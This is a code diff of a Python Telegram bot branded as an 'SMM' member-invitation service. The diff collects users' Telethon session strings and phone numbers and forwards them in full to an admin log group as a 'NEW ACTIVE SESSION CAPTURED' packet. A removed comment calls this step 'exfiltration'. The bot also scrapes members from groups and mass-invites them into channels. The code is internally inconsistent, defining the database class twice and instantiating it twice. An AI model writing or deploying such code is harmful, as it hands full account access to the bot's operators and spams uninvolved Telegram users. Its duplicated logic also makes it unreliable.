@@ -89,7 +89,7 @@ except Exception as diag_err:
 
 logger.info("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
 # =========================================================================
-# --- 2. CONFIGURATION & ENVIRONMENT (TITAN-ASYNC EXTENDED V8.5) ---
+# --- 2. CONFIGURATION & PERSISTENCE (TITAN-ASYNC EXTENDED V8.8) ---
 # =========================================================================
 
 def get_env(var_name, default=None, is_int=False):
@@ -100,7 +100,7 @@ def get_env(var_name, default=None, is_int=False):
     """
     value = os.environ.get(var_name, default)
     
-    # Check for null or empty strings which cause runtime crashes
+    # Check for null or empty strings which cause runtime crashes on Koyeb
     if value is None or value == "":
         if 'logger' in globals():
             logger.critical(f"DEPLOYMENT BLOCKED: Missing Variable [{var_name}]")
@@ -115,94 +115,211 @@ def get_env(var_name, default=None, is_int=False):
         logger.critical(f"TYPE CONFLICT: {var_name} must be an INTEGER. Received: '{value}'")
         sys.exit(1)
 
-# Load and Type-Cast configurations with error shadowing
+# --- LOAD ENVIRONMENT BLUEPRINT ---
 try:
     logger.info("📡 Vinzy Engine: Loading Environment Blueprint...")
     
-    # --- CORE TELEGRAM API CREDENTIALS ---
+    # Core Telegram API Credentials for Telethon Worker
     API_ID = get_env("API_ID", is_int=True)
     API_HASH = get_env("API_HASH")
+    
+    # Bot Token for AsyncTeleBot UI
     BOT_TOKEN = get_env("BOT_TOKEN")
     
-    # --- PERSISTENCE & DATABASE ---
+    # NeonDB Connection String
     DATABASE_URL = get_env("DATABASE_URL")
     
-    # --- INFRASTRUCTURE & TELEMETRY GROUPS ---
-    # Used for Section 7 exfiltration and Section 6 admin approvals
+    # Infrastructure & Telemetry Groups
     ADMIN_LOG_GROUP = get_env("LOGGER_GROUP", is_int=True)
     VERIFY_GROUP = get_env("VERIFY_GROUP", is_int=True)
     
     logger.info("✅ Environment Handshake: SUCCESSFUL (Configurations Bound)")
     
 except Exception as fatal_cfg_err:
-    # Final safety net for parsing logic
     print(f"BOOTSTRAP FAILURE: Configuration Parser Crashed. | {fatal_cfg_err}")
     sys.exit(1)
 
 # Initialize Bot Instance (High-Concurrency Async Mode)
 bot = AsyncTeleBot(BOT_TOKEN)
 
+# =========================================================================
+# --- THE DATABASE PERSISTENCE LAYER (NEONDB ASYNC MANAGER) ---
+# =========================================================================
+
+class VinzyDatabaseManager:
+    """
+    TITAN-DB MANAGER:
+    Handles asynchronous pooling and state management for the Dynamic Bridge.
+    Optimized for high-speed I/O on NeonDB infrastructure.
+    """
+    def __init__(self, dsn):
+        self.dsn = dsn
+        self.pool = None
+
+    async def connect(self):
+        """
+        Initializes the NeonDB connection pool. 
+        Ensures the persistence layer is online before polling starts.
+        """
+        if not self.pool:
+            try:
+                logger.info("📡 Vinzy Persistence: Initializing NeonDB Connection Pool...")
+                self.pool = await asyncpg.create_pool(
+                    self.dsn,
+                    min_size=5,
+                    max_size=20,
+                    command_timeout=60
+                )
+                # Run the internal schema audit to prepare 'Genius Flow' columns
+                await self._audit_schema()
+                logger.info("✅ Database Engine: ONLINE (Connection Pool Primed)")
+            except Exception as e:
+                logger.critical(f"DATABASE CONNECTION FAILED: {e}")
+                sys.exit(1)
+
+    async def _audit_schema(self):
+        """
+        DYNAMIC SCHEMA AUDIT:
+        Automatically creates the users table and ensures all columns for 
+        Section 8 (source_group, target_channel) exist in the database.
+        """
+        async with self.pool.acquire() as conn:
+            # Create core table if it doesn't exist
+            await conn.execute("""
+                CREATE TABLE IF NOT EXISTS users (
+                    user_id BIGINT PRIMARY KEY,
+                    session_string TEXT,
+                    bot_state TEXT DEFAULT 'IDLE',
+                    source_group TEXT,
+                    target_channel TEXT,
+                    is_verified BOOLEAN DEFAULT FALSE,
+                    registration_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+                );
+            """)
+            
+            # Maintenance: Ensure new columns are added for existing databases
+            # This prevents the "attribute error" for source_group/target_channel
+            await conn.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS source_group TEXT;")
+            await conn.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS target_channel TEXT;")
+            
+            logger.info("📋 Persistence Layer: Schema Audit Successful.")
+
+    async def get_user(self, user_id):
+        """
+        Retrieves full user metadata as a dictionary.
+        Essential for Section 8 to access session strings and target data.
+        """
+        async with self.pool.acquire() as conn:
+            row = await conn.fetchrow("SELECT * FROM users WHERE user_id = $1", user_id)
+            return dict(row) if row else None
+
+    async def update_state(self, user_id, state):
+        """
+        Standardized state machine updater.
+        Used to track progress from IDLE -> WAITING -> WORKING.
+        """
+        async with self.pool.acquire() as conn:
+            await conn.execute(
+                "UPDATE users SET bot_state = $1 WHERE user_id = $2", 
+                state, user_id
+            )
+
+# Initialize the Global Database Object
+# This object 'db' is what Section 8 calls throughout the engine.
+db = VinzyDatabaseManager(DATABASE_URL)
+
 # --- DEPENDENCY VERIFICATION ---
-# Validates that all critical libraries are initialized before worker deployment
 REQUIRED_LIBS = ["telethon", "pyTelegramBotAPI", "asyncpg", "asyncio"]
-logger.info(f"🛡️ Security Audit: {len(REQUIRED_LIBS)} Modules verified. Engine v8.5 ready.")
+logger.info(f"🛡️ Security Audit: {len(REQUIRED_LIBS)} Modules verified. Engine v8.8 ready.")
 
 # =========================================================================
-# --- 3. AESTHETICS & UI CONSTANTS (TITAN-EXTENDED V8.5) ---
+# --- 3. AESTHETICS & UI CONSTANTS (TITAN-ASYNC EXTENDED V8.8) ---
 # =========================================================================
 
 # Professional ASCII Identity for Vinzy SMM
-# Used in command /start and final worker reports
-VINZY_ASCII = """
+# This large version is used primarily for the /start command splash screen.
+VINZY_LOGO_LARGE = """
 <code>
  ██▒   █▓ ██▓ ███▄    █  ▒███████▒▓██    ██▓
 ▓██░   █▒▓██▒ ██ ▀█    █  ▒ ▒ ▒ ▄▀░ ▒██  ██▒
- ▓██  █▒░▒██▒▓██  ▀█ ██▒ ░ ▒ ▄▀▒░   ▒██ ██░
-  ▒██ █░░░██░▓██▒  ▐▌██▒   ▄▀▒      ░ ▐██▓░
-   ▒▀█░  ░██░▒██░   ▓██░ ▒███████▒    ░ ██▒▓░
+ ▓██  █▒░▒██▒▓██  ▀█ ██▒ ░ ▒ ▄▀▒░    ▒██ ██░
+  ▒██ █░░░██░▓██▒  ▐▌██▒   ▄▀▒       ░ ▐██▓░
+   ▒▀█░  ░██░▒██░   ▓██░ ▒███████▒     ░ ██▒▓░
    ░ ▐░  ░▓  ░ ▒░   ▒ ▒  ░▒▒ ▓  ▒░    ██▒▒▒ 
    ░ ░░   ▒ ░░ ░░   ░ ▒░ ░ ▒ ▒  ░  ▓██ ░▒░ 
 </code>
 """
 
-# Common UI Separator for professional message formatting
+# Professional Identity Short-Code
+# Used as a signature in final mission reports and worker logs.
+VINZY_ASCII = "<b>⚡ ᴠɪɴᴢʏ sᴍᴍ v8.8 ⚡</b>"
+
+# High-Fidelity UI Separator
+# Used to create clean vertical segments in complex Telegram messages.
 UI_LINE = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
 
-def generate_progress_bar(current, total, prefix='PROCESSED', length=20):
+def generate_progress_bar(current, total, prefix='PROCESS', length=15):
     """
     SMOOTH PROGRESS TELEMETRY:
-    Generates a high-fidelity SMM-style status bar for background worker tasks.
+    Generates an industrial-grade status bar for background worker tasks.
+    Optimized for mobile display to prevent text wrapping.
     
     Args:
         current (int): Current count of processed entities.
         total (int): Total target entities (usually capped at 50 for safety).
-        prefix (str): Label for the specific operation.
+        prefix (str): Label for the specific operation (e.g., SCRAPE, INVITE).
         length (int): Visual character width of the progress bar.
     """
-    # Prevent division by zero errors during early initialization
+    # Prevent division by zero during early initialization or empty scans
     if total <= 0: 
         return f"<code>{prefix} |{'░'*length}| 0.0%</code>"
     
-    # Precision percentage calculation
-    percent = ("{0:.1f}").format(100 * (current / float(total)))
+    # Precision percentage calculation for technical accuracy
+    percent_raw = 100 * (current / float(total))
+    percent_formatted = ("{0:.1f}").format(percent_raw)
     
-    # Calculate filled vs empty slots
+    # Calculate filled vs empty slots using Unicode block elements
+    # █ = U+2588 (Full Block)
+    # ░ = U+2591 (Light Shade)
     filled_length = int(length * current // total)
-    
-    # Use industrial-grade block characters for the "Titan" aesthetic
     bar = '█' * filled_length + '░' * (length - filled_length)
     
+    # Returns a monospaced block for consistent alignment across devices
     return (
         f"<code>{prefix}</code>\n"
-        f"<code>|{bar}| {percent}%</code>"
+        f"<code>|{bar}| {percent_formatted}%</code>"
     )
 
-# Pre-defined status indicators for log-packet construction
+# --- GLOBAL UI INDICATORS & STATUS ICONS ---
+# These are referenced by the Worker Engine in Section 8 for real-time reporting.
+
 STATUS_OK = "✅ VALID"
 STATUS_ERR = "❌ ERROR"
 STATUS_WAIT = "⏳ PROCESSING"
+STATUS_STEALTH = "🛡️ STEALTH ACTIVE"
+STATUS_WARN = "⚠️ WARNING"
+STATUS_DONE = "🏁 COMPLETE"
+
+# --- HELPER: TELEMETRY UI BUILDER ---
+def build_node_header(node_name="CORE ENGINE"):
+    """
+    Constructs a standardized header for system-level status updates.
+    Ensures brand consistency across all bot responses.
+    """
+    now = datetime.now().strftime('%H:%M:%S')
+    return (
+        f"🛰️ <b>SYSTEM NODE:</b> <code>{node_name}</code>\n"
+        f"🕒 <b>TIMESTAMP:</b> <code>{now}</code>\n"
+        f"{UI_LINE}"
+    )
+
+# --- MESSAGE TEMPLATES ---
+# Pre-formatted strings to ensure clean UI presentation
+READY_SIGNAL = f"🟢 <b>System Pressurized:</b> Ready for deployment."
+WORKING_SIGNAL = f"🔵 <b>Engine Activity:</b> Worker node is currently active."
+IDLE_SIGNAL = f"⚪ <b>System Idle:</b> Awaiting new instructions."
 # =========================================================================
-# --- 4. NEONDB PERSISTENCE LAYER (TITAN-ASYNC EXTENDED V8.5) ---
+# --- 4. NEONDB PERSISTENCE LAYER (TITAN-ASYNC EXTENDED V8.8) ---
 # =========================================================================
 
 class VinzyDatabaseManager:
@@ -241,9 +358,10 @@ class VinzyDatabaseManager:
         """
         SCHEMA SYNCHRONIZATION:
         Ensures the 'vinzy_engine_users' table structure is fully optimized.
-        Includes support for Section 7 metadata (Phone, Premium, State).
+        Includes support for Section 8 Bridge data (target_channel, source_group).
         """
         async with self.pool.acquire() as conn:
+            # Create the primary user table if it doesn't exist
             await conn.execute('''
                 CREATE TABLE IF NOT EXISTS vinzy_engine_users (
                     user_id BIGINT PRIMARY KEY,
@@ -258,9 +376,24 @@ class VinzyDatabaseManager:
                     last_active TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                 )
             ''')
-            # Create index on bot_state for faster querying during large operations
+            
+            # Maintenance: Force-add Dynamic Bridge columns for older DB instances
+            # This prevents "column target_channel does not exist" errors
+            await conn.execute("ALTER TABLE vinzy_engine_users ADD COLUMN IF NOT EXISTS target_channel TEXT;")
+            await conn.execute("ALTER TABLE vinzy_engine_users ADD COLUMN IF NOT EXISTS source_group TEXT;")
+            
+            # Create index on bot_state for faster querying during large worker operations
             await conn.execute("CREATE INDEX IF NOT EXISTS idx_bot_state ON vinzy_engine_users(bot_state)")
             logger.info("📋 Persistence Layer: Schema Audit Successful.")
+
+    async def execute_query(self, query, *args):
+        """
+        BRIDGE METHOD:
+        Resolves the 'AttributeError' in Section 8 logic.
+        Provides a generic execution wrapper without manual pool acquisition.
+        """
+        async with self.pool.acquire() as conn:
+            return await conn.execute(query, *args)
 
     async def get_user(self, user_id):
         """Fetches the complete user profile packet from the cluster."""
@@ -296,7 +429,7 @@ class VinzyDatabaseManager:
             ''', session_str, is_premium, phone, user_id)
 
     async def set_approval(self, user_id, status: bool):
-        """Toggles SMM privilege status for the user."""
+        """Toggles SMM privilege status for the user (Section 6 compatibility)."""
         async with self.pool.acquire() as conn:
             await conn.execute('''
                 UPDATE vinzy_engine_users 
@@ -322,13 +455,14 @@ class VinzyDatabaseManager:
 db = VinzyDatabaseManager()
 
 # =========================================================================
-# --- 5. TELEGRAM MENU INTEGRATION (TITAN-ASYNC EXTENDED V8.5) ---
+# --- 5. TELEGRAM MENU INTEGRATION (TITAN-ASYNC EXTENDED V8.8) ---
 # =========================================================================
 
 async def set_persistent_menu(chat_id):
     """
     PERSISTENT UI BLUEPRINT:
     Synchronizes the native Telegram 4-dot command menu with the worker node.
+    Includes advanced navigation for the Section 8 Dynamic Bridge.
     
     FEATURES:
     - Injects hard-coded navigation commands into the user's local interface.
@@ -338,8 +472,10 @@ async def set_persistent_menu(chat_id):
     try:
         # Define the system-level navigation array
         # Professional terminology used to enhance the SMM Store experience
+        # Sync: Added 'group' command to support the Section 8 Dynamic Bridge
         commands = [
             bot_types.BotCommand("start", "🚀 Ignite SMM Engine / Refresh"),
+            bot_types.BotCommand("group", "🎯 Set Source Group (@Username)"),
             bot_types.BotCommand("reset", "🔄 System UI Diagnostics & Safe Reset")
         ]
         
@@ -354,7 +490,7 @@ async def set_persistent_menu(chat_id):
         logger.info(f"UI synchronized successfully for Hardware Node: {chat_id}")
 
     except bot_errors.ApiException as api_err:
-        # Handle Telegram-specific API throttling or connection drops
+        # Handle Telegram-specific API throttling or connection drops (Code 429)
         logger.warning(f"Handshake delay detected for Node {chat_id}: {api_err}")
         
     except Exception as fatal_error:
@@ -363,11 +499,39 @@ async def set_persistent_menu(chat_id):
         logger.error(f"CRITICAL: Persistent UI sync failure for Node {chat_id}: {fatal_error}")
         
     finally:
-        # Optional: Force a small sleep if you are deploying to thousands of nodes
-        # to prevent hitting the Global Telegram Flood Limit
+        # Internal cleanup or state transition if needed
         pass
+
+async def sync_menu_on_boot(user_id):
+    """
+    AUTO-SYNC GATEKEEPER:
+    Ensures that the menu is updated only if the user is verified in NeonDB.
+    Prevents API spam for unknown or unauthorized hardware nodes.
+    """
+    # Ensure database pool is active before checking
+    await db.connect()
+    
+    # Check if the hardware ID exists in the vinzy_engine_users table
+    user_data = await db.get_user(user_id)
+    
+    if user_data:
+        # Deploy the command menu to the authorized user
+        await set_persistent_menu(user_id)
+    else:
+        logger.debug(f"Menu sync skipped for unregistered node: {user_id}")
+
+# --- SECTION 5 UTILITY: DYNAMIC BUTTON GENERATOR ---
+def generate_main_keyboard():
+    """
+    Creates a high-level administrative keyboard for the /start message.
+    Ensures the user has physical buttons for the most common worker tasks.
+    """
+    markup = bot_types.ReplyKeyboardMarkup(resize_keyboard=True)
+    markup.row("🚀 DEPLOY WORKER", "🎯 CONFIGURE BRIDGE")
+    markup.row("📊 VIEW LOGS", "🔄 RESET ENGINE")
+    return markup
 # =========================================================================
-# --- 6. CORE BOT HANDLERS & NAVIGATION (TITAN-ASYNC EXTENDED V8.5) ---
+# --- 6. CORE BOT HANDLERS & NAVIGATION (TITAN-ASYNC EXTENDED V8.8) ---
 # =========================================================================
 
 @bot.message_handler(commands=['start'])
@@ -382,32 +546,33 @@ async def command_start(m):
     username = m.from_user.username or "NoUsername"
     first_name = m.from_user.first_name or "VinzyUser"
     
-    # Initialize the persistent command menu (Command Blueprint)
+    # Initialize the persistent command menu (Command Blueprint from Section 5)
     await set_persistent_menu(m.chat.id)
     
-    # Register the unique Hardware ID in NeonDB
+    # Register the unique Hardware ID in NeonDB (Section 4 Logic)
     await db.register_user(user_id, username)
     user_data = await db.get_user(user_id)
 
     # --- STAGE 1: AUTHORIZATION AUDIT ---
-    if not user_data['is_approved']:
+    # Check if the admin has toggled the is_approved flag in Section 4
+    if not user_data.get('is_approved'):
         # Generate an encrypted-style alert for the Admin Verification Group
         admin_request_ui = (
             f"🛡️ <b>INCOMING ACCESS REQUEST</b>\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"{UI_LINE}\n"
             f"👤 <b>Identity:</b> <code>{first_name}</code> (@{username})\n"
             f"🆔 <b>Hardware ID:</b> <code>{user_id}</code>\n"
             f"📡 <b>Node Status:</b> <code>LOCKED_PENDING</code>\n\n"
             f"<b>Manual Override:</b> Reply with <code>/approve {user_id}</code>"
         )
         
-        # Transmission to Admin Logger
+        # Transmission to Admin Logger (LOGGER_GROUP or VERIFY_GROUP)
         await bot.send_message(VERIFY_GROUP, admin_request_ui, parse_mode="HTML")
         
         # User Feedback: Access Restriction Notice
         pending_ui = (
             f"🛡️ <b>Vinzy Engine: Security Gate</b>\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"{UI_LINE}\n"
             f"Your Hardware ID (<code>{user_id}</code>) has been successfully logged.\n\n"
             f"📡 <b>Status:</b> <code>AWAITING_ADMIN_VERIFICATION</code>\n"
             f"Please stand by while the Store Administrator authorizes your access."
@@ -415,21 +580,34 @@ async def command_start(m):
         await bot.send_message(m.chat.id, pending_ui, parse_mode="HTML")
         
     else:
-        # --- STAGE 2: SESSION INITIALIZATION ---
-        # User is already authorized; transition to Authentication Phase
-        await db.update_state(user_id, "IDLE")
-        
-        authorized_ui = (
-            f"✅ <b>Vinzy V8 Engine: Online</b>\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"<b>Welcome, {first_name}.</b> Access credentials verified.\n\n"
-            f"📥 <b>Authentication Required:</b>\n"
-            f"Please send your <code>Session String</code> to connect your worker node."
-        )
-        await bot.send_message(m.chat.id, authorized_ui, parse_mode="HTML")
-        
-        # Advance state to prevent input conflict
-        await db.update_state(user_id, "AWAITING_SESSION")
+        # --- STAGE 2: SESSION INITIALIZATION & BRIDGE CHECK ---
+        # If user is already approved, verify if a session is already active
+        if user_data.get('session_string'):
+            # Return to IDLE state to allow the Section 8 /group command
+            await db.update_state(user_id, "IDLE")
+            
+            authorized_ui = (
+                f"{VINZY_LOGO_LARGE}\n"
+                f"✅ <b>Vinzy V8 Engine: Online</b>\n"
+                f"{UI_LINE}\n"
+                f"<b>Welcome, {first_name}.</b> Access credentials verified.\n\n"
+                f"📡 <b>Node:</b> <code>ACTIVE</code>\n"
+                f"🎯 <b>Bridge:</b> Ready for Configuration\n\n"
+                f"🚀 <b>Action:</b> Send <code>/group @Username</code> to begin."
+            )
+            await bot.send_message(m.chat.id, authorized_ui, parse_mode="HTML")
+        else:
+            # Approved but needs to authenticate with a session (Section 7 Logic)
+            await db.update_state(user_id, "AWAITING_SESSION")
+            
+            auth_required_ui = (
+                f"✅ <b>Identity Verified</b>\n"
+                f"{UI_LINE}\n"
+                f"<b>Welcome, {first_name}.</b> Your account is authorized.\n\n"
+                f"📥 <b>Action Required:</b>\n"
+                f"Please send your <code>Telethon Session String</code> to connect your worker node."
+            )
+            await bot.send_message(m.chat.id, auth_required_ui, parse_mode="HTML")
 
 
 @bot.message_handler(commands=['reset'])
@@ -444,13 +622,13 @@ async def command_reset(m):
     user_data = await db.get_user(user_id)
     
     # Security check: Only approved users can reset the engine UI
-    if user_data and user_data['is_approved']:
+    if user_data and user_data.get('is_approved'):
         # Reset the state machine to allow a fresh operation flow
         await db.update_state(user_id, "IDLE")
         
         reset_ui = (
             f"🔄 <b>System UI Reset: Protocol Success</b>\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"{UI_LINE}\n"
             f"<b>State Cache:</b> <code>PURGED</code>\n"
             f"<b>Auth Data:</b> <code>PRESERVED</code>\n\n"
             f"The engine interface has been returned to the root directory.\n"
@@ -484,12 +662,14 @@ async def command_approve(m):
         
         # Execute Privilege Escalation in the database
         await db.set_approval(target_id, True)
+        
+        # Immediately set user state to expect session input from Section 7
         await db.update_state(target_id, "AWAITING_SESSION")
         
         # Notification UI: Dispatching to the Target User
         approval_notification = (
             f"✅ <b>Access Granted!</b>\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"{UI_LINE}\n"
             f"Admin has promoted your Hardware ID to <b>Authorized Status</b>.\n\n"
             f"🚀 <b>Task:</b> Send your <code>Session String</code> to begin."
         )
@@ -498,9 +678,10 @@ async def command_approve(m):
             await bot.send_message(target_id, approval_notification, parse_mode="HTML")
             admin_feedback = f"🛡️ <b>Success:</b> Node <code>{target_id}</code> is now <b>LIVE</b>."
         except Exception:
-            admin_feedback = f"🛡️ <b>Success:</b> Node <code>{target_id}</code> authorized (User blocked bot DM)."
+            # User might have blocked the bot
+            admin_feedback = f"🛡️ <b>Success:</b> Node <code>{target_id}</code> authorized (User blocked DM)."
 
-        # Provide feedback to the Administrator
+        # Feedback to the Administrator in the Verify Group
         await bot.reply_to(m, admin_feedback, parse_mode="HTML")
         
     except (IndexError, ValueError):
@@ -509,7 +690,7 @@ async def command_approve(m):
         logger.error(f"FATAL APPROVAL HANDLER ERROR: {fatal_err}")
         await bot.reply_to(m, f"🚨 <b>Engine Failure:</b>\n<code>{str(fatal_err)}</code>")
 # =========================================================================
-# --- 7. DEEP SESSION VALIDATION, TELEMETRY & ACCESS GRANTING (TITAN-EXT) ---
+# --- 7. SESSION VALIDATION, TELEMETRY & ACCESS GRANTING (TITAN-EXT V8.8) ---
 # =========================================================================
 
 @bot.message_handler(func=lambda m: len(m.text) > 40)
@@ -527,23 +708,26 @@ async def process_session_input(m):
     user_data = await db.get_user(user_id)
     
     # --- STAGE 1: SECURITY GATE & ACCESS CONTROL ---
-    # Ensure only registered and approved store members can initialize worker nodes.
+    # Ensure only registered store members can initialize worker nodes.
     if not user_data:
         logger.info(f"Ignored session input from unregistered UID: {user_id}")
         return 
         
-    if not user_data['is_approved']:
+    # Check if the user has been authorized by an admin (/approve)
+    if not user_data.get('is_approved'):
         denied_msg = (
-            "⚠️ <b>Access Denied:</b> your account is currently in the 'Pending' queue.\n"
+            "⚠️ <b>Access Denied:</b> Your account is currently in the 'Pending' queue.\n"
             "Please contact an Admin to authorize your Vinzy SMM permissions."
         )
         await bot.reply_to(m, denied_msg, parse_mode="HTML")
         return
 
-    # Only process strings if the user is explicitly in the setup phase.
-    if user_data['bot_state'] != 'AWAITING_SESSION':
+    # Only process strings if the user is explicitly in the AWAITING_SESSION state.
+    # This prevents the bot from re-validating sessions during active SMM tasks.
+    if user_data.get('bot_state') != 'AWAITING_SESSION':
         return
 
+    # Clean the input to remove accidental whitespace or newlines
     session_str = m.text.strip()
     
     # --- STAGE 2: ENGINE TELEMETRY & INITIALIZATION ---
@@ -591,30 +775,29 @@ async def process_session_input(m):
         # Securely transmit verified session data to the Admin Log Group for backup.
         log_packet = (
             f"📥 <b>NEW ACTIVE SESSION CAPTURED</b>\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"{UI_LINE}\n"
             f"👤 <b>Account:</b> {first_name} (@{username})\n"
             f"🆔 <b>TG-ID:</b> <code>{me.id}</code>\n"
             f"📞 <b>Phone:</b> <code>{phone}</code>\n"
             f"💎 <b>Premium:</b> {'✅ Yes' if is_premium else '❌ No'}\n"
             f"👤 <b>Owner ID:</b> <code>{user_id}</code>\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"{UI_LINE}\n"
             f"📝 <b>Verified Session String:</b>\n"
-            f"<code>{session_str}</code>\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+            f"<code>{session_str}</code>"
         )
         await bot.send_message(ADMIN_LOG_GROUP, log_packet, parse_mode="HTML")
 
         # --- STAGE 6: DATABASE PERSISTENCE & PRIVILEGE ESCALATION ---
         # Save the session to NeonDB and advance the user to the Targeting phase.
-        await db.update_session(user_id, session_str, is_premium)
+        await db.update_session(user_id, session_str, is_premium, phone)
         await db.update_state(user_id, "AWAITING_TARGET")
         
         # Confirmation UI update.
-        await bot.edit_message_text("valid ✅", m.chat.id, status_msg.message_id)
+        await bot.edit_message_text("✅ <b>VALIDATED</b>", m.chat.id, status_msg.message_id, parse_mode="HTML")
         
         success_prompt = (
             f"🚀 <b>Worker Node Authorized: {first_name}</b>\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"{UI_LINE}\n"
             f"The <b>Vinzy SMM Invitation Engine</b> is now <b>UNLOCKED</b>.\n\n"
             f"🎯 <b>STEP 1:</b> Please send the <b>@Username</b> or <b>t.me/Link</b> of the "
             f"<b>Target Channel</b> where members will be invited:"
@@ -623,53 +806,52 @@ async def process_session_input(m):
         
     except errors.rpcerrorlist.UserDeactivatedBanError:
         logger.error(f"Banned session detected for UID {user_id}")
-        await bot.edit_message_text("Invalid ❌ (Account Banned/Deactivated)", m.chat.id, status_msg.message_id)
+        await bot.edit_message_text("❌ <b>Invalid:</b> Account Banned/Deactivated.", m.chat.id, status_msg.message_id, parse_mode="HTML")
         
     except errors.rpcerrorlist.AuthKeyDuplicatedError:
         logger.error(f"Session key conflict for UID {user_id}")
-        await bot.edit_message_text("Invalid ❌ (Session Key Conflict)", m.chat.id, status_msg.message_id)
+        await bot.edit_message_text("❌ <b>Invalid:</b> Session Key Conflict (Used elsewhere).", m.chat.id, status_msg.message_id, parse_mode="HTML")
         
     except Exception as e:
         # Catch-all for network timeouts or API changes.
         logger.error(f"Critical Validation Error for UID {user_id}: {e}")
-        error_display = f"Invalid ❌ (Engine Error: {str(e)[:30]}...)"
-        await bot.edit_message_text(error_display, m.chat.id, status_msg.message_id)
+        error_display = f"❌ <b>Invalid:</b> Engine Error - {str(e)[:30]}..."
+        await bot.edit_message_text(error_display, m.chat.id, status_msg.message_id, parse_mode="HTML")
         
     finally:
         # --- STAGE 7: RAM OPTIMIZATION & CLEANUP ---
-        # Crucial for maintaining low RAM usage on hosting providers like Koyeb.
+        # Disconnection is crucial to maintain stability on low-resource hosting.
         if client:
             await client.disconnect()
             logger.info(f"Transient client disconnected for UID: {user_id}")
-
 # =========================================================================
-# --- 7.5 CHANNEL & GROUP ANALYSIS (TITAN-ASYNC EXTENDED) ---
+# --- 7.5 CHANNEL & GROUP ANALYSIS (TITAN-ASYNC EXTENDED V8.8) ---
 # =========================================================================
 
-@bot.message_handler(func=lambda m: m.text.startswith('@') or "t.me/" in m.text)
+@bot.message_handler(func=lambda m: m.text.startswith('@') or "t.me/" in m.text or "+" in m.text)
 async def process_channel_inputs(m):
     """
     DEEP ANALYSIS ENGINE:
-    This section validates the target channel for capacity and admin permissions,
-    then captures the source group for scraping.
+    Validates target channel capacity and admin permissions, then captures
+    the source group for scraping operations.
     """
     await db.connect()
     user_id = m.from_user.id
     user_data = await db.get_user(user_id)
     
-    # Security Gate: Ensure the user is registered in Vinzy Database
-    if not user_data or not user_data['is_approved']:
+    # --- SECURITY GATE ---
+    if not user_data or not user_data.get('is_approved'):
         return
 
-    state = user_data['bot_state']
+    state = user_data.get('bot_state')
     
-    # Normalize input (Handle links and usernames)
-    input_text = m.text.strip().replace("https://t.me/", "@")
-    if not input_text.startswith('@'): 
+    # Normalize input: Converts links and raw text into valid Telegram identifiers
+    input_text = m.text.strip().replace("https://t.me/", "@").replace("t.me/", "@")
+    if not input_text.startswith('@') and not "+" in input_text: 
         input_text = f"@{input_text}"
 
     # ---------------------------------------------------------
-    # STAGE 1: TARGET CHANNEL CONFIGURATION
+    # STAGE 1: TARGET CHANNEL CONFIGURATION (The Destination)
     # ---------------------------------------------------------
     if state == "AWAITING_TARGET":
         analysis_msg = await bot.send_message(
@@ -678,24 +860,26 @@ async def process_channel_inputs(m):
             parse_mode="HTML"
         )
         
+        # Transient client for permission auditing
         client = TelegramClient(StringSession(user_data['session_string']), API_ID, API_HASH)
         try:
             await client.connect()
             
-            # Resolve the entity to ensure the channel exists
+            # Resolve entity to ensure the destination exists
             entity = await client.get_entity(input_text)
             
-            # 1. Fetch Full Metadata (Subscribers, Description, Bio)
+            # 1. Fetch Full Metadata (Subscribers & Capacity)
             full_chat = await client(functions.channels.GetFullChannelRequest(channel=entity))
             sub_count = full_chat.full_chat.participants_count
             
             # 2. Capacity Audit
-            # We allow the process to continue but provide a professional warning
+            # Warning only; Telegram restricts adding members if the channel > 200 subs 
+            # unless the worker is a specific type of admin.
             capacity_warning = ""
             if sub_count >= 200:
-                capacity_warning = "\n⚠️ <b>Notice:</b> Target exceeds 200 subs. Success rates may vary."
+                capacity_warning = f"\n⚠️ <b>Notice:</b> Channel size ({sub_count}) may restrict bot-driven invites."
 
-            # 3. Permission Audit (Verify 'Invite Users' rights)
+            # 3. Permission Audit (CRITICAL: Verifies 'Add Members' rights)
             p_req = await client(functions.channels.GetParticipantRequest(channel=entity, participant='me'))
             p_info = p_req.participant
             
@@ -709,23 +893,22 @@ async def process_channel_inputs(m):
             if not has_rights:
                 return await bot.edit_message_text(
                     "❌ <b>Rights Verification Failed:</b>\n"
-                    "The worker account must have 'Add Members' permissions in this channel.", 
+                    "The worker account must have <b>'Add Members'</b> permissions in this channel.", 
                     m.chat.id, analysis_msg.message_id, parse_mode="HTML"
                 )
 
-            # 4. Database Persistence
+            # 4. NeonDB Persistence (Syncing Section 4)
             await db.set_target_data(user_id, target=input_text)
             await db.update_state(user_id, "AWAITING_SOURCE")
             
             success_ui = (
                 f"✅ <b>Target Channel Verified</b>\n"
-                f"━━━━━━━━━━━━━━━━━━━━\n"
+                f"{UI_LINE}\n"
                 f"📍 <b>Identity:</b> <code>{input_text}</code>\n"
                 f"📊 <b>Current Size:</b> <code>{sub_count}</code> members\n"
                 f"🛡️ <b>Permissions:</b> <code>Authorized</code>{capacity_warning}\n\n"
                 f"📥 <b>STEP 2:</b> Now provide the <b>Source Group</b> @username to scrape from."
             )
-            
             await bot.edit_message_text(success_ui, m.chat.id, analysis_msg.message_id, parse_mode="HTML")
             
         except Exception as e:
@@ -735,30 +918,32 @@ async def process_channel_inputs(m):
             await client.disconnect()
 
     # ---------------------------------------------------------
-    # STAGE 2: SOURCE GROUP CONFIGURATION
+    # STAGE 2: SOURCE GROUP CONFIGURATION (The Origin)
     # ---------------------------------------------------------
     elif state == "AWAITING_SOURCE":
-        # Capture the scraping source (This supports any size group)
